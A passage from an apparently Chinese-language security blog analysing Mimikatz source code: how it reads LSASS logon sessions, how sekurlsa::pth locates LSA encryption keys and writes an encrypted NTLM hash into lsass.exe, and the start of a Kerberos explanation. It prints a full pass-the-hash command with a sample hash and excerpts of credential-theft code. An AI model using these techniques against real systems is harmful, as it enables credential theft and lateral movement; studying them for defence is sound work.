//securityStruct.address 保存的是<span class="type">LogonSessionList</span>数组地址</span></div><div class="line"> .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后第三次调用kull_m_memory_copy()函数，获取双向链表的第一个节点,aBuffer.address就是第一个节点的地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;<span class="keyword">data</span>, helper-&gt;</span>tailleStruct))<span class="comment">//aBuffer.address指向的是LogonSessionList双向列表的某个节点</span></div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonId= (PLUID)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLuid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonType= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonType));</div><div class="line"><span class="function"><span class="title">sessionData</span>.Session= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToSession));</div><div class="line"><span class="function"><span class="title">sessionData</span>.UserName= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToUsername);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonDomain= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToDomain);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentials= *(PVOID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentials);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pSid= *(PSID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToPSid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentialManager);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonTime= *((PFILETIME)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonTime));</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonServer= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonServer);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure><p> <img src="http://hacky.wang/blog/20220215/7ozemelppDsx.png?imageslim" alt="mark"></p></li></ul><h2 id="Pass-the-Hash攻击-传递Hash攻击"><a href="#Pass-the-Hash攻击-传递Hash攻击" class="headerlink" title="Pass the Hash攻击(传递Hash攻击)"></a>Pass the Hash攻击(传递Hash攻击)</h2><ul><li><p>哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证(攻击者无须通过解密hash值来获取明文密码。)，以此来横向访问其他网络系统。 </p></li><li><p>在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存,凭据管理器(CredManage),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</p></li><li><p>但是hash的获取是固定存在的，因为window中经常需要用hash来进行验证和交互。所以利用hash来进行横向移动在内网渗透中经常充当主力的角色。</p></li></ul><h2 id="sekurlsa-pth源码分析"><a href="#sekurlsa-pth源码分析" class="headerlink" title="sekurlsa::pth源码分析"></a>sekurlsa::pth源码分析</h2><ul><li>Mimikatz的sekurlsa::pth命令主要用户进行Pass The Hash攻击，其实现在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的kuhl_m_sekurlsa_pth函数。</li><li>命令如下：<code>sekurlsa::pth /user:Administrator /domain:192.168.230.129 /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></li><li><p>首先将分别解析命令行所传递的参数，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"luid"</span>, &amp;szLuid, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">tokenStats.AuthenticationId.HighPart = <span class="number">0</span>; <span class="comment">// because I never saw it != 0</span></div><div class="line">tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"user"</span>, &amp;szUser, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"domain"</span>, &amp;szDomain, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">isImpersonate = kull_m_string_args_byName(argc, argv, <span class="string">L"impersonate"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">kull_m_string_args_byName(argc, argv, <span class="string">L"run"</span>, &amp;szRun, isImpersonate ? _wpgmptr : <span class="string">L"cmd.exe"</span>);</div><div class="line">kprintf(<span class="string">L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n"</span>, szUser, szDomain, szRun, isImpersonate ? <span class="string">L"yes"</span> : <span class="string">L"no"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : domain\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : user\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>关于散列，一共可以有4种不同的类型可以选择，分别是aes128，aes256，ntlm，rc4。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, L<span class="string">"rc4"</span>, &amp;szNTLM, <span class="built_in">NULL</span>) || kull_m_string_args_byName(argc, argv, L<span class="string">"ntlm"</span>, &amp;szNTLM, <span class="built_in">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))</div><div class="line">&#123;</div><div class="line"><span class="built_in">data</span>.NtlmHash = ntlm;</div><div class="line">kprintf(L<span class="string">"NTLM\t: "</span>); kull_m_string_wprintf_hex(<span class="built_in">data</span>.NtlmHash, LM_NTLM_HASH_LENGTH, <span class="number">0</span>); kprintf(L<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"ntlm hash/rc4 key length must be 32 (16 bytes)\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>接着，调用kull_m_process_create()函数，kull_m_process_create()函数参数主要有</p><ul><li>szRun：需要运行的程序</li><li>szUser：用户名</li><li>szDomain：域</li><li>szPassword：密码(此处密码为空)<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(<span class="name">kull_m_process_create</span>(<span class="name">KULL_M_PROCESS_CREATE_LOGON</span>, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L<span class="string">""</span>, <span class="symbol">&amp;processInfos</span>, FALSE))</div></pre></td></tr></table></figure></li></ul></li><li><p>在kull_m_process_create()函数中，调用CreateProcessWithLogonW()创建一个进程。CreateProcessWithLogonW可以使用指定的凭证信息创建进程。但是传递的Password值是空的，以便后续填充。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">case</span> <span class="attr">KULL_M_PROCESS_CREATE_LOGON:</span></div><div class="line"><span class="string">status</span> <span class="string">=</span> <span class="string">CreateProcessWithLogonW(user,</span> <span class="string">domain,</span> <span class="string">password,</span> <span class="string">iLogonFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">dupCommandLine,</span> <span class="string">iProcessFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">&amp;startupInfo,</span> <span class="string">ptrProcessInfos);</span></div><div class="line"><span class="string">break;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure></li><li><p>接着调用kuhl_m_sekurlsa_pth_luid()函数，kuhl_m_sekurlsa_pth_luid()携带的参数是一个PSEKURLSA_PTH_DATA结构，其中包含6个成员。LogonId为登录的id，NtlmHash为NTLM散列，也就是常规Pth传入的值。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef struct _SEKURLSA_PTH_DATA &#123; </div><div class="line"><span class="type">PLUID</span><span class="type">LogonId</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">NtlmHash</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes256Key</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes128Key</span>;</div><div class="line"><span class="type">BOOL</span>isReplaceOk;</div><div class="line">&#125; <span class="type">SEKURLSA_PTH_DATA</span>, *<span class="type">PSEKURLSA_PTH_DATA</span>;</div></pre></td></tr></table></figure></li><li><p>kuhl_m_sekurlsa_pth_luid()首先会调用kuhl_m_sekurlsa_acquireLSA()，该函数首先会遍历Lsass.exe进程的模块，根据不同的sekurlsa模块不同的命令，选择不同的模块。例如msv命令就是寻找lsasvr.dll这个模块<br>  <img src="http://hacky.wang/blog/20220217/3PHnIpOeBOLI.png?imageslim" alt="mark"></p></li><li><p>kuhl_m_sekurlsa_acquireLSA()主要调用kull_m_process_getVeryBasicModuleInformations()函数通过PEB的Ldr列表获取指定模块的信息，主要是模块的基地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="keyword">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">for</span>(pLdrEntry  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr-&gt;</span>InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));</div><div class="line">(pLdrEntry != (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector))) &amp;&amp; continueCallback;</div><div class="line"><span class="function"><span class="title">pLdrEntry</span>  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (pLdrEntry-&gt;</span>InMemoryOrderLinks.Flink ) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))</div><div class="line">)</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.DllBase.address = pLdrEntry-&gt;</span>DllBase;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.SizeOfImage = pLdrEntry-&gt;</span>SizeOfImage;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.NameDontUseOutsideCallback = &amp;pLdrEntry-&gt;</span>BaseDllName;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation);</div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg);</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/CXUrtKPGnsJt.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList的特征码，LogonSessionList结构体包含了登录会话的诸多信息。其主要会调用kuhl_m_sekurlsa_utils_search_generic()函数。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>首先调用kull_m_patch_getGenericFromBuild()函数，其会根据系统版本选择指定的特征码。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword">&#123;</span></div><div class="line"><span class="keyword"></span>SIZE_T i<span class="comment">;</span></div><div class="line">PKULL_M_PATCH_GENERIC current = NULL<span class="comment">;</span></div><div class="line"></div><div class="line">for(i = <span class="number">0</span><span class="comment">; i &lt; cbGenerics; i++)</span></div><div class="line">&#123;</div><div class="line">if(generics[i].MinBuildNumber &lt;= <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword"></span>current = &amp;generics[i]<span class="comment">;</span></div><div class="line">else <span class="keyword">break;</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">return current<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_search搜索指定特征码的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for(<span class="name">CurrentPtr</span> = (<span class="name">PBYTE</span>) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address<span class="comment">; !status &amp;&amp; (CurrentPtr + Length &lt;= limite); CurrentPtr++)</span></div><div class="line">status = RtlEqualMemory(<span class="name">Pattern-&gt;address</span>, CurrentPtr, Length)<span class="comment">;</span></div><div class="line">CurrentPtr--<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>调用lsassLocalHelper-&gt;AcquireKeys()函数，本质是调用kuhl_m_sekurlsa_nt6_acquireKeys()函数。其本质和kuhl_m_sekurlsa_utils_search_generic()函数一样，都是先调用kull_m_patch_getGenericFromBuild选择合适的特征码，然后搜索。其目的是为了寻找用于加密凭证的秘钥，因为凭证在内存中加密存储的。其实windows并不是直接比较里面的NTLM散列，而是比较经过加密之后的散列的密文。然后调用利用寻找到的秘钥调用BCryptGenerateSymmetricKey生成秘钥。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = &#123; <span class="comment">// InitializationVector, h3DesKey, hAesKey</span></div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">63</span>, <span class="number">-69</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">59</span>, <span class="number">-61</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),PTRN_WIN8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">62</span>, <span class="number">-70</span>, <span class="number">23</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">61</span>, <span class="number">-73</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1809,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">67</span>, <span class="number">-89</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/cIDEWiDFgUuh.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_enum寻找登录凭证，最终调用kuhl_m_sekurlsa_enum_callback_msv_pth函数将加密之后的凭证写入Lsass.exe进程的指定的LogonSessionList数组中。首先比较是否是指定的LogonId。然后调用kuhl_m_sekurlsa_msv_enum_cred()函数</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)</div><div class="line">&#123;</div><div class="line">PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;</div><div class="line">MSV1_0_PTH_DATA_CRED credData = &#123;pData, pthData&#125;;</div><div class="line"><span class="keyword">if</span>(SecEqualLuid(pData-&gt;LogonId, pthData-&gt;LogonId))</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_msv_enum_cred(pData-&gt;cLsass, pData-&gt;pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &amp;credData);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最终调用kuhl_m_sekurlsa_msv_enum_cred_callback_pth，在kuhl_m_sekurlsa_msv_enum_cred_callback_pth函数中，首先会调用kuhl_m_sekurlsa_nt6_LsaEncryptMemory函数加密NTLM散列。其加密逻辑是如果加密的凭证能被8整除，则使用AES，否则使用3DES。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(*<span class="function"><span class="title">pthDataCred</span>-&gt;</span><span class="function"><span class="title">pSecData</span>-&gt;</span><span class="function"><span class="title">lsassLocalHelper</span>-&gt;</span><span class="function"><span class="title">pLsaProtectMemory</span>)(msvCredentials, pCredentials-&gt;</span>Credentials.Length);</div><div class="line">VOID WINAPI kuhl_m_sekurlsa_nt6_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);</div><div class="line">&#125;</div><div class="line"><span class="comment">//////加密逻辑</span></div><div class="line"><span class="keyword">if</span>(cbMemory % <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line">hKey = &amp;kAes.hKey;</div><div class="line">cbIV = sizeof(InitializationVector);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">hKey = &amp;k3Des.hKey;</div><div class="line">cbIV = sizeof(InitializationVector) / <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">__try</div><div class="line">&#123;</div><div class="line">status = cryptFunc(*hKey, pMemory, cbMemory, <span class="number">0</span>, LocalInitializationVector, cbIV, pMemory, cbMemory, &amp;cbResult, <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_copy函数中的WriteProcessMemory写入Lsass.exe进程空间。最后Resume线程。完事PtH。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="function"><span class="title">status</span> = WriteProcessMemory(Destination-&gt;</span><span class="function"><span class="title">hMemory</span>-&gt;</span><span class="function"><span class="title">pHandleProcess</span>-&gt;</span><span class="function"><span class="title">hProcess</span>, Destination-&gt;</span><span class="function"><span class="title">address</span>, Source-&gt;</span>address, Length, NULL);</div><div class="line">break;</div></pre></td></tr></table></figure></li></ul><h2 id="NTLM-凭证生成"><a href="#NTLM-凭证生成" class="headerlink" title="NTLM 凭证生成"></a>NTLM 凭证生成</h2><ul><li><code>msv1_0!LsaApLogonUserEx2</code>—&gt;<code>lsasrv!LsapCreateLsaLogonSession</code>—-&gt;<code>msv1_0!SpAcceptCredentials</code></li></ul><h2 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h2><ul><li><p>Kerberos协议的组成角色：</p><ul><li>客户端：发送请求的一方</li><li>服务端：接收请求的一方</li><li>秘钥分发中心(Key Distribution Center KDC),KDC分为两部分：<ul><li>AS(Authentication Server)：用于认证客服端，以及发放后续客户端用于访问TGS(Ticket Granting Server)的TGT(凭据授予票据Ticket Granting Ticket)</li><li>TGS(Ticket Granting Server):同于发放认证过程和客户端访问服务端的票据</li></ul></li></ul></li><li><p>Kerberos协议通过引入同时认识客户端(A)和服务端(B)的秘钥分发中心(C)实现身份认证。简化的流程如下：</p><ul><li>第一步：客户端向KDC请求获取访问服务端的服务授予票据</li><li>第二歩：客户端拿着服务授予票据访问服务端</li></ul></li><li><p>上述步骤存在的问题：</p><ul><li>1.KDC如何判断客户端的安全性(真实性)？</li><li>2.服务端如何判断客户端的服务授予票据的真实性？</li></ul></li><li><p>Kerberos认证协议的前提：</p><ul><li>Kerberos存在一个数据库，运维人员会添加可以使用认证服务的人员和网络服务。相当于一个白名单。</li><li>当用户被添加到数据库，会根据当前的密码生成一把秘钥存储在数据库中(很重要)。并且保存用户的基本信息，以供认证。</li><li>只要两两通讯就会进行认证。</li></ul></li><li><p>两个个人理解的概念：机器秘钥(与机器密码强相关的秘钥)，会话秘钥(CT_SK,CS_SK)本次会话中使用的秘钥，会消失。</p></li></ul><h3 id="Kerberos协议第1次通讯"><a href="#Kerberos协议第1次通讯" class="headerlink" title="Kerberos协议第1次通讯"></a>Kerberos协议第1次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端明文向KDC发送请求，该次请求中携带了自己的用户名，主机IP，和当前时间戳</li></ul></li><li><p>KDC行为：</p><ul><li>1.KDC(其中的AS认证服务器)在数据库中比较，是否存在该用户名的用户，<strong>但是不会判断身份的可靠性</strong></li><li>2.如果没有该用户名，认证失败。如果存在，则发送下面两部分数据给客户端<ul><li>TGT(Ticket Granting Ticket即票据授予票据,TGT客户端使用TGT去KDC获取服务授予票据):TGT包含客户端的Name,Ip,时间戳，TGS_Name，TGT的有效时间，以及<strong>一把客户端和TGS通讯的CT_SK(Client And TGS Session Key CT_SK)</strong>。TGT使用TGS的秘钥进行加密(客户端无法解密)，并且秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li><li>将CT_SK,TGS_Name,TGT的有效时间，当前时间戳等数据使用<strong>客户端的秘钥(保存在数据库中)</strong>加密的数据。该秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li></ul></li></ul></li><li><p>总结：KDC总是会传递两部分数据，一部分是客户端能解密的数据(KDC存在客户端秘钥)，第二部分是客户端不能解密的数据(使用TGS秘钥)，<strong>重点是将使用客户端秘钥加密过的CT_SK传递给客户端，避免CT_SK中间被窃取，因为非法的客户端不存在真实的客户端秘钥！这样就实现了CT_SK的传递</strong>。</p></li><li>备注：<strong>凭据信息(TGT,ST)是由和机器密码强相关的秘钥进行加密，主机秘钥在网络中不传递。由来校验加密数据的端点信息和凭据中的端点信息。第一次通讯主要有两个目的，第一，验证客户端是否存在，第二，传递CT_KS会话秘钥。</strong></li></ul><h3 id="Kerberos协议第2次通讯"><a href="#Kerberos协议第2次通讯" class="headerlink" title="Kerberos协议第2次通讯"></a>Kerberos协议第2次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端接收上述KDC发送的TGT和加密数据，利用自己的秘钥解密加密数据，<strong>并获取CT_SK会话秘钥</strong>。如果获取的时间戳和自己发送的时间戳差值大于5mins，则认证结束。否则客户端向TGS发送请求。</li><li>2.利用接收到的CT_SK(Session 